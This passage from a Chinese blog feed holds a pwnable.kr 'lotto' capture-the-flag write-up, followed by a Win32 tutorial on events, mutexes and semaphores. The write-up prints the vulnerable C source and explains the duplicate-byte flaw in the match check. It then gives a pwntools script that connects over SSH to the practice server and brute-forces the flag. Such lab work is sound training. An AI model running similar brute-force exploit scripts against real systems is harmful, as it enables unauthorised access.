class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在本地运行程序了解过程，感觉相当于一个猜数游戏，分析程序代码</p><p><img src="pwnable.kr-lotto.assets/image-20210130221629615.png"></p><h4 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure><p>上面代码意思为生成6个小于等于45的随机数，刚开始我一个urandom和random是一样的伪随机数，但我用c语言写了一个简单的程序后发现并不一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> lotto[<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">        read(fd, lotto, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>,lotto[i] % <span class="number">45</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 a.out文件后运行结果</p><p><img src="pwnable.kr-lotto.assets/image-20210130222234571.png"></p><p>所以这道题并不能使用伪随机的特性来做</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>继续分析下面的检测函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很有意思，我看第一遍时没想那么多，只是想到了输入的6个字节的顺序不一定要和lotto数组中的数据顺序相同，但是在后面发现这里面存在一个点就是，这没考虑我们输入的6个字节全是一样的情况，可以利用爆破</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>这里注意一点细节是我们输入的字节大小需要小于等于45才可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;######&#x27;</span></span><br><span class="line">sh = ssh(<span class="string">&#x27;lotto&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line">p = sh.process(<span class="string">&#x27;./lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Submit your 6 lotto bytes : &#x27;</span>,payload)</span><br><span class="line">    msg = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;bad luck&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg:</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        log.success(msg)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.close()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p><img src="pwnable.kr-lotto.assets/image-20210130223218226.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;pwnable.kr-lotto.assets/image-20210130221133246.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;利用scp命令从服务器下载源码到本地&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>🎦Win32学习记录4(事件 互斥体 信号量)</title>
    <link href="http://example.com/2020/11/12/windows/Win32-4/"/>
    <id>http://example.com/2020/11/12/windows/Win32-4/</id>
    <published>2020-11-12T14:00:20.492Z</published>
    <updated>2021-05-07T11:23:24.405Z</updated>
    
    <content type="html"><![CDATA[<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><ul><li>通知状态</li></ul><p>​        表示操作系统可以调用</p><ul><li><p>未通知状态</p><p>操作系统不可以调用</p><h4 id="WaitForSingleObject函数"><a href="#WaitForSingleObject函数" class="headerlink" title="WaitForSingleObject函数"></a><strong>WaitForSingleObject</strong>函数</h4></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hHandle</strong></p><p>对象的句柄。</p></li><li><p><strong>dwMilliseconds</strong></p><p>超时间隔（以毫秒为单位）。如果指定了非零值，则函数将等待，直到发出信号通知对象或间隔过去为止。如果<em>dwMilliseconds</em>为零，则如果未用信号通知对象，则函数不会进入等待状态；否则，函数将进入等待状态。它总是立即返回。如果<em>dwMilliseconds</em>为<strong>INFINITE</strong>，则该函数仅在信号通知对象时返回。</p></li></ul><h4 id="WaitForMultipleObjects函数"><a href="#WaitForMultipleObjects函数" class="headerlink" title="WaitForMultipleObjects函数"></a>WaitForMultipleObjects函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        nCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> HANDLE lpHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL         bWaitAll,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>nCount</strong></p><p><em>lpHandles</em>指向的数组中对象句柄的数量。对象句柄的最大数量为<strong>MAXIMUM_WAIT_OBJECTS</strong>。此参数不能为零。</p></li><li><p><strong>lpHandles</strong></p><p>对象句柄数组。</p></li><li><p><strong>bWaitAll</strong></p><p>如果此参数为<strong>TRUE</strong>，则当信号<em>lpHandles</em>数组中所有对象的状态时，该函数将返回。如果为<strong>FALSE</strong>，则当任何一个对象的状态设置为已信号通知时，该函数将返回。在后一种情况下，返回值指示其状态导致函数返回的对象。</p></li><li><p><strong>dwMilliseconds</strong></p><p>超时间隔（以毫秒为单位）。如果指定了非零值，则函数将等待，直到发出指定对象的信号或间隔过去为止。如果<em>dwMilliseconds</em>为零，则如果未发出指定对象的信号，则函数不会进入等待状态；否则，函数将进入等待状态。它总是立即返回。如果<em>dwMilliseconds</em>为<strong>INFINITE</strong>，则该函数仅在发出指定对象的信号时返回。</p></li></ul><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><h4 id="事件对象的创建"><a href="#事件对象的创建" class="headerlink" title="事件对象的创建"></a>事件对象的创建</h4><ul><li><p>函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ul><li><p><strong>lpEventAttributes</strong></p><p>内核对象都拥有该参数，一般情况下设置<strong>NULL</strong></p></li><li><p><strong>bManualReset</strong></p><p>布尔类型</p><ul><li><p>TRUE</p><p>创建一个手动重置的时间对象，重置需要用到ResetEvent函数将事件状态设置为非信号状态(未通知状态)</p></li><li><p>FALSE</p><p>创建一个自动重置事件对象,在释放单个等待线程后，系统自动将事件状态重置为未通知状态</p><p>{简单来说}</p></li></ul></li><li><p><strong>bInitialState</strong></p><p>如果此参数为<strong>TRUE</strong>，则表示事件对象的初始状态；</p><p><strong>FALSE</strong>，将显示事件对象的初始状态。否则，它是无信号的。</p></li><li><p><strong>lpName</strong></p><p>事件名称</p></li></ul></li></ul><h4 id="事件对象的控制"><a href="#事件对象的控制" class="headerlink" title="事件对象的控制"></a>事件对象的控制</h4><h5 id="SetEvnet"><a href="#SetEvnet" class="headerlink" title="SetEvnet()"></a>SetEvnet()</h5><ul><li><p>函数定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hEvent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>将事件设置为已通知状态</p></li></ul><h5 id="ResetEvent"><a href="#ResetEvent" class="headerlink" title="ResetEvent"></a>ResetEvent</h5><ul><li><p>函数定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ResetEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hEvent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>将事件设置为未通知状态</p></li></ul><h4 id="事件同步–消费者与生产者"><a href="#事件同步–消费者与生产者" class="headerlink" title="事件同步–消费者与生产者"></a>事件同步–消费者与生产者</h4><p>​        事件的同步解释为将线程按照规定的顺序进行，线程被创建出来是被随机分配的CPU的，那个CPU空闲就分配给哪个线程(说得不是很专业，具体参照微软官方定义)，所以事件的同步可以理解为人为的控制线程运行的顺序</p><p>​        下面为用事件进行线程同步的思路</p><ul><li><p>创建两个事件，事件A和事件B，一个事件初始化为通知状态，另一个初始化为已通知状态，且两个事件都设置为手动更改状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a_Event = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line">b_Event = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li><p>创建线程1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"> &#123;</span><br><span class="line"> WaitForSingleObject(a_Event,INFINITE);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;This is a Producer Create A+++++\n&quot;</span>);</span><br><span class="line"> Sleep(<span class="number">500</span>);</span><br><span class="line"> SetEvent(b_Event);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在线程1中将事件B设置为已通知状态</p></li><li><p>创建线程2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(b_Event,INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is a Consumer Destroy A-----\n&quot;</span>);</span><br><span class="line">Sleep(<span class="number">500</span>);</span><br><span class="line">SetEvent(a_Event);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在结束时将线程1设置为已通知状态</p></li></ul><p>这样就可以使两个线程交替进行，且充分利用了CPU</p><h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><h4 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutexA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpMutexAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialOwner,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>dwDesiredAccess</strong></p><p>互斥体属于内核对象，一般情况下设置为NULL</p></li><li><p><strong>bInheritHandle</strong></p><p>如果此值为<strong>TRUE</strong>，并且调用方创建了互斥量，则调用线程将获得该互斥对象的初始所有权。否则，调用线程将无法获得该互斥锁的所有权。</p></li><li><p>lpName</p><p>创建的互斥体的名称，如果在一个进程中使用可以为NULL，如果在不同进程中使用需要赋予名称</p></li></ul><h4 id="在其他进程中打开互斥体"><a href="#在其他进程中打开互斥体" class="headerlink" title="在其他进程中打开互斥体"></a>在其他进程中打开互斥体</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenMutexW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL    bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>dwDesiredAccess</strong></p><p>互斥体属于内核对象，一般情况下设置为NULL</p></li><li><p><strong>bInheritHandle</strong></p><p>如果此值为<strong>TRUE</strong>，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄</p></li><li><p><strong>lpName</strong></p><p>需要打开的互斥体的名称</p></li></ul><h4 id="释放指定互斥对象的所有权"><a href="#释放指定互斥对象的所有权" class="headerlink" title="释放指定互斥对象的所有权"></a>释放指定互斥对象的所有权</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReleaseMutex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hMutex</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hMutex</strong></p><p>互斥对象的句柄。该 <strong>CreateMutex</strong>或<strong>OpenMutex</strong>函数返回此句柄。</p></li></ul><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><h4 id="创建信号量"><a href="#创建信号量" class="headerlink" title="创建信号量"></a>创建信号量</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphoreW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG                  lInitialCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG                  lMaximumCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR               lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>lpSemaphoreAttributes</strong></p><p>互斥体属于内核对象，一般情况下设置为NULL</p></li><li><p><strong>lInitialCount</strong></p><p>信号量对象的初始计数。此值必须大于或等于零且小于或等于<em>lMaximumCount</em>。当信号量的计数大于零时，将发出信号状态；在信号量为零时，将不发出信号状态。每当等待函数释放等待信号量的线程时，计数就会减少一。通过调用ReleaseSemaphore函数将计数增加指定的数量 。</p></li><li><p><strong>lMaximumCount</strong></p><p>信号量对象的最大计数。该值必须大于零。</p></li><li><p><strong>lpName</strong></p><p>创建的信号量名称，可以NULL</p></li></ul><h4 id="释放等待信号量"><a href="#释放等待信号量" class="headerlink" title="释放等待信号量"></a>释放等待信号量</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReleaseSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSemaphore,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG   lReleaseCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPLONG lpPreviousCount</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hSemaphore</strong></p><p>信号量对象的句柄。该 CreateSemaphore或 OpenSemaphore函数返回该句柄。</p></li><li><p><strong>lReleaseCount</strong></p><p>信号量对象的当前计数要增加的数量。该值必须大于零。如果指定的数量将导致信号量的计数超过创建信号量时指定的最大计数，则该计数不会更改，函数将返回<strong>FALSE</strong>。</p></li><li><p><strong>lpPreviousCount</strong></p><p>指向变量的指针，以接收信号量的先前计数。如果不需要上一个计数，则此参数可以为<strong>NULL</strong>。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;对象&quot;&gt;&lt;a href=&quot;#对象&quot; class=&quot;headerlink&quot; title=&quot;对象&quot;&gt;&lt;/a&gt;对象&lt;/h3&gt;&lt;h4 id=&quot;状态&quot;&gt;&lt;a href=&quot;#状态&quot; class=&quot;headerlink&quot; title=&quot;状态&quot;&gt;&lt;/a&gt;状态&lt;/h4&gt;&lt;ul&gt;
&lt;</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="线程" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>🎦Win32学习记录-3(线程控制与临界区)</title>
    <link href="http://example.com/2020/11/05/windows/Win32-3/"/>
    <id>http://example.com/2020/11/05/windows/Win32-3/</id>
    <published>2020-11-05T13:20:56.052Z</published>
    <updated>2021-05-07T11:23:08.473Z</updated>
    
